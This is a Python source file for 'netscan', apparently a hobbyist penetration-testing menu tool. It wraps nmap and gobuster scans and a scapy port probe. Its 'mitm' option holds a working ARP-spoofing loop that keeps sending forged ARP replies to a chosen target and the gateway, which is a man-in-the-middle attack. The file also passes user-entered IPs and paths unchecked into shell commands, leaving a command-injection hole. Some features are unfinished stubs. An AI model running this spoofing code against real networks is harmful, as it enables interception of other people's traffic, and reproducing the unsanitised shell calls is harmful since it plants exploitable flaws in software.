#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  netscan.py
#  
#  Copyright 2021  <pi@markofficehost>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#  use at own risk
#
#  use for edu purposes only
#  made by MarkApppprogammer
#
#

#imports
from time import sleep
import sys
import subprocess
from scapy.all import *
import scapy.all as scapy


#vars
src_port = 10000 #CHANGE THIS
dst_port = 80
port80open = False

#the code
#all functions
		

def webservertests():
	#asks for IP 
	IP = input("[*] Enter IP: ")
	dst_ip = ""
	dst_ip = IP
	sleep(0.5)
	print("[*] Starting network tests")
	sleep(0.5)
	print("[*] Acessing Website..")
	sleep(0.5)
	print("[*] Starting gobuster...")
	wordlistlocation = input("[*] Where is the wordlist you want to use: ")
	command = "gobuster -u " + IP + " -w " + wordlistlocation + ' -s "204,301,302,307,401,403"' #EDIT GOBUSTER COMMAND
	sys.stdout.flush()
	p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
	(output, err) = p.communicate()
	newoutput = str(output, 'UTF-8')
	homescreen()

def nmapscan():
	#asks for IP 
	IP = input("[*] Enter IP: ")
	dst_ip = ""
	dst_ip = IP
	sleep(0.5)
	print("[*] Using nmap to scan for vunls...")
	sleep(0.5)
	print("[*] This may take some time...")

	#runs nmap command
	command = "nmap -sC -sV " + IP #EDIT NMAP COMMAND
	sys.stdout.flush()
	p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
	(output, err) = p.communicate()
	newoutput = str(output, 'UTF-8')

	#prints output of nmap
	print ("{}".format(newoutput))
	homescreen()

def basicostests():
	sleep(0.5)
	print("[*] Not redy yet, Check agian later")
	homescreen()
	homescreen()


def basicnettests():
	sleep(0.5)
	#get Ip
	IPadders = input("[*] Enter IP: ")
	#choses
	sleep(0.5)
	print("[*] Which would you like to check for:")
	print("1-> mitm(man in the middle) ")
	print("2-> Dos(Denial of service) ")
	inputchoice = input("[*] Chose 1 or 2: ")
	if (inputchoice == "1"):
		sleep(0.5)
		print("[*] Starting mitm...")
		sleep(0.5)
		print("[*] Scanning...")
		sleep(0.5)
		arp_request=scapy.ARP(pdst=IPadders)
		brodcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
		arp=brodcast/arp_request
		answered=scapy.srp(arp, timeout=1,verbose=False)[0]
		for element in answered:
			print("[*] IP of Gateway:{}".format(element[1].psrc))
			print("[*] MAC address of Gateway: {}\n".format(element[1].hwsrc))
			macadders0 = "{}".format(element[1].hwsrc)
			macadders = macadders0
		command = "ip r"#EDIT COMMAND
		sys.stdout.flush()
		p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
		(output, err) = p.communicate()
		newoutput = str(output, 'UTF-8')
		print("[*] What is your subnetmask?")
		print("[*] Ex: 192.168.1.0/24")
		subnetmask = input("[*] Subnetmask: ")
		sleep(0.5)
		print("[*] Starting nmap...")
		sleep(0.5)
		command = "nmap " + subnetmask #EDIT COMMAND
		sys.stdout.flush()
		p = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
		(output, err) = p.communicate()
		newoutput = str(output, 'UTF-8')
		otherip = input("Enter IP of device wanted to spoof: ")
		sleep(0.5)
		arp_request=scapy.ARP(pdst=otherip)
		brodcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
		arp=brodcast/arp_request
		answered=scapy.srp(arp, timeout=1,verbose=False)[0]
		for element in answered:
			print("[*] IP of Target:{}".format(element[1].psrc))
			print("[*] MAC address of Target: {}\n".format(element[1].hwsrc))
			macadders1 = "{}".format(element[1].hwsrc)
			macaddersother = macadders1
		sleep(0.5)

		#spoofing functions
		def spooftarget():
			print("[*] Sending spoofed packets to target...")
			packet = scapy.ARP(op = 2, pdst = otherip, hwdst = macaddersother, psrc = IPadders)
			send(packet, verbose=False)
		
		def spoofgateway():
			print("[*] Sending spoofed packets to router...")
			packet = scapy.ARP(op = 2, pdst = IPadders, hwdst = macadders, psrc = otherip)
			send(packet, verbose=False)

		sent_packets_count = 0
		while True:
			sleep(1)
			spooftarget()
			spoofgateway()
			sent_packets_count = sent_packets_count + 2
			print("[*] Packets sent " + str(sent_packets_count) + " to target and gateway.")
		
	if (inputchoice == "2"):
		sleep(0.5)
		print("[*] Starting Dos...")

def basicwebtests():
	#sending packets
	#asks for IP 
	IPadders = input("[*] Enter IP: ")
	dst_ip = IPadders
	dst_port = 80
	sleep(0.5)
	print("[*] Checking port vulns using scapy...")
	tcp_connect_scan_resp = sr1(scapy.IP(dst=dst_ip)/scapy.TCP(sport=src_port,dport=dst_port,flags="S"),timeout=10)
	if(tcp_connect_scan_resp.haslayer(scapy.TCP)):
		if(tcp_connect_scan_resp.getlayer(scapy.TCP).flags == 0x12):
			send_rst = sr(scapy.IP(dst=dst_ip)/scapy.TCP(sport=src_port,dport=dst_port,flags="AR"),timeout=10)
			print("[*] Port 80 is Open")
			print("[*] Possibly a web server running on " + IPadders)
			webservertests()
		elif (tcp_connect_scan_resp.getlayer(scapy.TCP).flags == 0x14):
			print ("[*] Port 80 is closed, trying port 443")
			dst_port = 443
			tcp_connect_scan_resp = sr1(scapy.IP(dst=dst_ip)/scapy.TCP(sport=src_port,dport=dst_port,flags="S"),timeout=10)
			if(tcp_connect_scan_resp.haslayer(scapy.TCP)):
					if(tcp_connect_scan_resp.getlayer(scapy.TCP).flags == 0x12):
							send_rst = sr(scapy.IP(dst=dst_ip)/scapy.TCP(sport=src_port,dport=dst_port,flags="AR"),timeout=10)
							print("[*] Port 443 is Open")
							sleep(0.5)
							print("[*] Possibly a web server running on " + IPadders)
							webservertests()
					elif (tcp_connect_scan_resp.getlayer(scapy.TCP).flags == 0x14):
							print ("[*] Both Port 80 and Pory 443 are closed on " + IPadders)
							homescreen()


#some design stuff
print(" _   _      _   ____")                  
print("| \ | | ___| |_/ ___|  ___ __ _ _ __  ")
print("|  \| |/ _ \ __\___ \ / __/ _` | '_ \ ")
print("| |\  |  __/ |_ ___) | (_| (_| | | | | ")
print("|_| \_|\___|\__|____/ \___\__,_|_| |_| ")


print("")

#home function
def homescreen():
	print("[*] What tests would you like to do: ")
	print("1-> webtests")
	print("2-> osrelatedtests")
	print("3-> networktests")
	print("4-> run a nmap scan")
	testtype = input("[*] Tests 1 or 2 or 3 or 4: ")
	if (testtype == "1"):
		basicwebtests()
	elif (testtype == "2"):
		basicostests()
	elif (testtype == "3"):
		basicnettests()
	elif (testtype == "4"):
		nmapscan()
	else:
		print("[*] Please Enter 1,2,3, or 4: ")
		homescreen()
			
		


#check interface 
print("[*] What interface are you using?")
interface = input("[*] Interface: ")
sleep(0.5)
homescreen()









#end the code
